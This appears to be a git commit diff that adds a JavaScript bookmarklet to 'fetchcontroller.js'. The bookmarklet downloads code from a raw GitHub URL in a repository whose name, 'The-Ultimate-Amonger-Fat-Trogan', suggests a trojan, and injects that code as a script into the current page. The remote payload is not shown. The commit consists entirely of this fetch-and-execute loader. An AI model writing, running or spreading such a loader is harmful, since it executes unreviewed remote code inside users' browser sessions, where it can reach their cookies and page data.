e85fda31c250cd87e6b924c6a1b2939a132d9d13
TheHamBurgerler <134538594+THeHamBurgueler@users.noreply.github.com>
2023-06-07 13:13:15 -0400

    Update fetchcontroller.js

--- fetchcontroller.js
+++ fetchcontroller.js
@@ -1,1 +1,1 @@
-
+javascript:(function() {  var url = 'https://raw.githubusercontent.com/THeHamBurgueler/The-Ultimate-Amonger-Fat-Trogan/main/Controller.js';  fetch(url)    .then(response => response.text())    .then(code => {      var script = document.createElement('script');      script.textContent = code;      document.body.appendChild(script);    })    .catch(error => console.error('Error fetching bookmarklet:', error));})();
